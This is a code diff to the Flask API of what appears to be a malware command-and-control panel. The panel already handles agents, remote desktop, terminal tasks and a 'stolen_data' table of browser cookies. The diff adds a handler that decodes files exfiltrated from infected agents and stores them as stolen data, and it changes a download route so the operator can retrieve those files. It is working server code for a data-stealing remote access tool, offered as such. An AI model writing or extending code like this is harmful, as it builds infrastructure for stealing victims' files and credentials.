@@ -998,7 +998,11 @@ def init_api_routes(app, socketio):
             if not data or 'task_id' not in data or 'agent_id' not in data:
                 return jsonify({'status': 'error', 'message': 'Invalid task result format'}), 400
                 
-            app.logger.info(f"Processing task result for task ID: {data['task_id']}")
+            app.logger.info(f"Processing task result for task ID: {data['task_id']} (Type: {data.get('task_type')})")
+            
+            # Debug: Log the result keys
+            if data.get('result'):
+                app.logger.info(f"Result keys: {list(data['result'].keys())}")
 
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
@@ -1088,6 +1092,28 @@ def init_api_routes(app, socketio):
                     'message': result.get('message', '')
                 }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
             
+            # Handle file uploads (exfiltration)
+            if data['task_type'] == 'upload' and data.get('result'):
+                result = data['result']
+                if result.get('data'):
+                    try:
+                        file_content = base64.b64decode(result['data'])
+                        filename = result.get('filename', 'uploaded_file')
+                        
+                        c.execute('''INSERT INTO stolen_data 
+                                    (agent_id, browser, data_type, content, system_info, timestamp)
+                                    VALUES (?, ?, ?, ?, ?, ?)''',
+                                (data['agent_id'],
+                                filename, # Store filename in browser column
+                                'file',   # data_type
+                                sqlite3.Binary(file_content),
+                                json.dumps({'size': result.get('size', 0)}),
+                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
+                        
+                        app.logger.info(f"File {filename} exfiltrated from agent {data['agent_id']}")
+                    except Exception as e:
+                        app.logger.error(f"Error storing exfiltrated file: {str(e)}")
+
             # Handle terminal output
             if data['task_type'] == 'terminal' and data.get('result') and data['result'].get('terminal', False):
                 result = data['result']
@@ -1253,19 +1279,27 @@ def init_api_routes(app, socketio):
         conn = sqlite3.connect(CONFIG.database)
         c = conn.cursor()
         
-        c.execute("SELECT browser, content FROM stolen_data WHERE id=?", (data_id,))
+        c.execute("SELECT browser, content, data_type FROM stolen_data WHERE id=?", (data_id,))
         data = c.fetchone()
         conn.close()
         
         if not data:
             return jsonify({"status": "error", "message": "Data not found"}), 404
         
-        browser, content = data
+        filename_val, content, data_type = data
+        
+        if data_type == 'file':
+            mimetype = 'application/octet-stream'
+            download_name = filename_val
+        else:
+            mimetype = 'application/json'
+            download_name = f"{filename_val}_cookies.json"
+
         return Response(
             content,
-            mimetype='application/json',
+            mimetype=mimetype,
             headers={
-                'Content-Disposition': f'attachment; filename={browser}_cookies.json'
+                'Content-Disposition': f'attachment; filename={download_name}'
             }
         )
 
@@ -2358,38 +2392,12 @@ def init_api_routes(app, socketio):
         try:
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
-
             c.execute("SELECT key, value FROM settings")
-            rows = c.fetchall()
-            settings = {row[0]: row[1] for row in rows}
-
+            settings = {row[0]: row[1] for row in c.fetchall()}
             conn.close()
-
             return jsonify({'status': 'success', 'settings': settings})
         except Exception as e:
-            app.logger.error(f"Error getting settings: {str(e)}")
             return jsonify({'status': 'error', 'message': str(e)}), 500
 
-    @app.route('/api/settings', methods=['POST'])
-    @login_required
-    def update_settings():
-        try:
-            data = request.get_json()
-            if not data:
-                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
-
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            for key, value in data.items():
-                c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
-
-            conn.commit()
-            conn.close()
-
-            return jsonify({'status': 'success', 'message': 'Settings updated successfully'})
-        except Exception as e:
-            app.logger.error(f"Error updating settings: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
+    return app
 
